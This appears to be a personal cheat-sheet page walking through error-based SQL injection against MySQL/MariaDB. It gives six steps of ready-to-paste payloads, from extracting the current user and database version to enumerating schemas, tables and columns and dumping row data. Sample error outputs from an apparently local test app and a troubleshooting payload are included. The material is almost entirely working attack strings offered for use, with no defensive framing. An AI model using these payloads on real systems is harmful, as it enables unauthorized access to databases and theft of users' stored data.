
---

### ✅ **STEP 1. Try basic error-based injection (Extract Current User)**

See if the app shows SQL error messages at all:

`abc' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e7e7e,(SELECT user()),0x7e7e7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -`

If this works and you see something like:

 `mysqli::query(): (23000/1062): Duplicate entry '~~~root@localhost~~~1' for key 'group_key' in <b>C:\xampp\htdocs\ai\includes\functions.php`

.......you're golden, proceed to the next step.

If this does not work, you will have to try a different approach, such as [[Time-Based Blind SQL Injection (MySQL) BURP]]

**NOTE ALSO, THIS WILL GIVE YOU THE CURRENT USER: root@localhost**

---

### ✅  **Step 2 - Extract Database Version**

`abc' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, VERSION(), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -`

You should see a visible error message that includes the database name and version, for example:

`:  mysqli::query(): (23000/1062): Duplicate entry ':10.4.24-MariaDB:1' for key 'group_key' in <b>C:\xampp\htdocs\ai\includes\functions.php`

**Here you can see the database name and version: 10.4.24-MariaDB**

----

### ✅  **Step 3 - Extract ALL Database Names**

To list **all** database names one by one, you repeat the same payload changing the offset in `LIMIT <offset>,1` each time to get each database name.

`abc' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT schema_name FROM information_schema.schemata LIMIT X,1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -`

For example:
    
- First request with `LIMIT 0,1`
    
- Second request with `LIMIT 1,1`
    
- Third request with `LIMIT 2,1`  
    ... and so on.

Each time, check the error message for the database name between the colons (`:`).

When the error no longer contains a new database name, you’ve listed all databases.

----

### ✅  **Step 4 - Extract Table Names From a Database**

To extract table names from a specific database, you need to follow the same kind of iterative approach taken in `Step 3 - Extract ALL Database Names`.

**The key different here is you also need to add the database name as the value of the `table_schema' attribute (hopefully you will have a list of database names from `Step 3 - Extract ALL Database Names`)**

`abc' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema='PUT_DATABASE_NAME_HERE' LIMIT X,1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -`

Example:

- For the first table: `LIMIT 0,1`
    
- For the second table: `LIMIT 1,1`
    
- For the third: `LIMIT 2,1`
    
- And so on…

Each time, check the error message for the table name between the colons (`:`).

When the error no longer contains a new table name, you’ve listed all tables in that particular database.

----

### ✅  **Step 5 - Extract Column Names From a Table**

Use this payload format to extract column names from a table, one by one:

`abc' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='ADD_TABLE_NAME_HERE' AND table_schema='ADD_DATABASE_NAME_HERE' LIMIT X,1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -`

**You need to add the table name as the value of the `table_name` attribute and the database name as the value of the `table_schema` attribute.**

---

Example:

- For the first column name: `LIMIT 0,1`
    
- For the second column name: `LIMIT 1,1`
    
- For the third column name: `LIMIT 2,1`
    
- And so on…

Each time, check the error message for the column name between the colons (`:`).

When the error no longer contains a new column name, you’ve listed all columns in that particular table.

----

### ✅  **Step 6- Extract Data from Rows**

**You are now at the perfect point to start extracting actual data from database.**

We will use a payload similar to the one you used for column names but change it to extract values from specific columns and rows.

**You will need to know the column headers, found in `Step 5 - Extract Column Names From a Table.`**
#### 🧪 Example Payload:

`abc' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT column_name_here FROM database.table LIMIT 0,1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -`

1. Replace `column_name_here` with the actual name of the column you want to extract data from.
2. Replace `database.table`  with the database name and table name.

To iterate through each row replace `LIMIT 0,1` sequentially, like so:
 
- `LIMIT 1,1`
    
- `LIMIT 2,1`
    
- And so on…

#### TROUBLESHOOT:

You may get an error similar to the following when trying to execute the above payload:

`mysqli::query(): (21000/1242): Subquery returns more than 1 row in <b>C:\xampp\htdocs\ai\includes\functions.php`

If so, try this alternative payload:

`abc' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT substr(column_name_here,1,100) FROM database.table LIMIT 0,1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -`

1. Replace `column_name_here` with the actual name of the column you want to extract data from.
2. Replace `database.table`  with the database name and table name.

To iterate through each row replace `LIMIT 0,1` sequentially, like so:
 
- `LIMIT 1,1`
    
- `LIMIT 2,1`
    
- And so on…

#### Why this second payload works to resolve the error:

- In MySQL, when you write a **subquery** like `(SELECT email FROM ai.user LIMIT 0,1)`, it returns a result **set** — even if it’s just one value.
    
- But **you can't embed a result set inside a `CONCAT()`**, unless it's explicitly turned into a single value — a **scalar**.
    

> ❌ Without `SUBSTR()`, MySQL says:  
> _“Subquery returns more than 1 row”_ — even if it’s just one.

✅ `SUBSTR(...)` tells MySQL:

> "Hey, treat this as just one string" → now `CONCAT(...)` works without crashing.

----

**IF YOU STILL DO NOT GET ANY RESULTS, SWITCH TO: [[Time-Based Blind SQL Injection (MySQL) BURP]]**
